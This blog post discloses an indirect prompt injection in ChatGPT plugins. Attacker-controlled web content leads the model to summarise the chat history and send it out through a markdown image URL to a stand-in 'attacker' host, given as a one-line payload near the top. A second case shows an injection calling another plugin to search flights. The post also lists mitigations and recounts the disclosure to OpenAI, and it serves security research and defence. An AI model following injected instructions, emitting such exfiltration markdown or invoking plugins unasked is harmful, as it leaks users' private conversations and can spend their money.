---
title: "ChatGPT Plugins: Data Exfiltration via Images & Cross Plugin Request Forgery"
date: 2023-05-16T07:45:38-07:00
tags: [
     "aiml", "machine learning","red", "threats", "ai injections"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "ChatGPT: Data Exfiltration via Plugins and Markdown Injection"
  description: "Plugins can return malicious content and hijack your AI."
  image: "https://embracethered.com/blog/images/2023/hacker-white.jpg"
---

This post shows how a malicious website can take control of a ChatGPT chat session and exfiltrate the history of the conversation.

## Plugins, Tools and Integrations

With plugins, data exfiltration can happen by sending too much data into the plugin in the first place. More security controls and insights on what is being sent to the plugin are required to empower users.

**However, this post is not about sending too much data to a plugin, but about a malicious actor who controls the data a plugin retrieves**.

### Untrusted Data and Markdown Injection

The individual controlling the data a plugin retrieves can exfiltrate chat history due to ChatGPT's rendering of markdown images. 

Basically, if the LLM returns a markdown image in the form of

```
![data exfiltration in progress](https://attacker/q=*exfil_data*)
```

ChatGPT will render it automatically and retrieve the URL. During an Indirect Prompt Injection the adversary controls what the LLM is doing (I call it AI Injection for a reason), and it can ask to summarize the past history of the chat and append it to the URL to exfiltrate the data.

I'm not the only one who points this out, [Roman Samoilenko has observed and posted about this vulnerability in ChatGPT before](https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2). Roman found it March 14th. I ran across it separatley a few weeks after.

### Proof of Concept Demonstration

This is possible with plugins, e.g. via the `WebPilot Plugin` or check out the [YouTube Transcript Plugin Injection](/blog/posts/2023/chatgpt-plugin-youtube-indirect-prompt-injection/) I posted about the other day. 

The LLM's response can contain markdown (or instruct the AI to build it on the fly), summarize the past conversation, URL encode that summary and append that as query parameter. And off it goes to the attacker.

Here is how this looks in action:

[![Data exfiltration in progress](/blog/images/2023/ai-exfil-progress.png)](/blog/images/2023/ai-exfil-progress.png)

The text that is being exfiltrated including "TooManySecrets123" is something that was written earlier in the chat conversation.

And here is an end to end video POC:

{{< youtube PIY5ZVktiGs >}}


Feel free to skip forward in the middle section - it's a bit slow. 

But wait, there is more....

### Can an attacker call another Plugin during the injection?

**Short answer is yes.** 

**This is an interesting variant of `Cross Site Request Forgery` actually, but we will need a new name for it, maybe `Cross Plugin Request Forgery`.**

Here is an example of an Indirect Prompt Injection calling another plugin (Expedia) to look for flights:

[![AI Injections searches for flights](/blog/images/2023/ai-injection-call-plugin.png)](/blog/images/2023/ai-injection-call-plugin.png)

Yes, random webpages and comments on sites will soon hijack your AI and spend your money.

## Mitigations and Suggestions

Safe AI assistants would be really awesome to have, the power of ChatGPT is amazing! So what could be done to improve the security posture? 

- Its unclear why a plugins have access to the history of the conversation. This could be isolated. It would be better if plugins go off do their work, rather then giving it access to the entire conversation history, or allow invoking other plugins.
- A security contract for plugins is needed. Who is responsible for what? What data is sent to the plugin? Currently there is no defined or enforced schema that could help mitigate such problems. Open AI mentions **Human in the loop** as a [core safety best practice](https://platform.openai.com/docs/guides/safety-best-practices), but end-users have little to no control at the moment once they start using them.
- In fact the idea of having some sort of **kernel LLM** and other sandbox LLM is discussed by [Simon Willison, who has thought about this already in a lot more detail](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/).
- NVIDIA has been working on [NeMo GuardRails](https://blogs.nvidia.com/blog/2023/04/25/ai-chatbot-guardrails-nemo/) to help keep bots in check
- Scenarios like rendering images could be implemented as a dedicated feature, rather than depending on the convenience of markdown. (e.g. links being returned that are not injected into the chat context, but as references after the main message).
- Only use and point plugins to data you fully trust. 

A lot more research is needed, both from offensive and defensive side. And at this point, with the speed of adoption and new tools being released it seems that raising awareness to have more smart people look into this (and how to fix it) is the best we can do.

## Conclusion

With the advent of plugins Indirect Prompt Injections are now a reality within ChatGPT's ecosystem. As attacks evolve we will probably learn and see nefarious text and instructions on websites, blog posts, comments,.. to attempt to take control of your AI.

### Responsible Disclosure

I first disclosed the image markdown injection issue to Open AI on April, 9th 2023. 

After some back and forth, and highlighting that plugins will allow to exploit this remotely, I was informed that image markdown injection is a feature:

> "The issue you've described is a feature of our system, and we don't believe that there is any practical way to exploit markdown rendering based on other security controls we have put in place. We'd like our users to be able to retrieve images and render markdown to use within chatGPT and other products, so we don't plan on changing any implementation at this time to protect against self-XSS or similar low-risk threats."


## References

* [Roman Samoilenko - New prompt injection attack on ChatGPT web version. Markdown images can steal your chat data.](https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2)
* [Open AI Safety Best Practices](https://platform.openai.com/docs/guides/safety-best-practices)
* [Dual LLM pattern](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/)
* [NeMo GuardRails](https://blogs.nvidia.com/blog/2023/04/25/ai-chatbot-guardrails-nemo/)
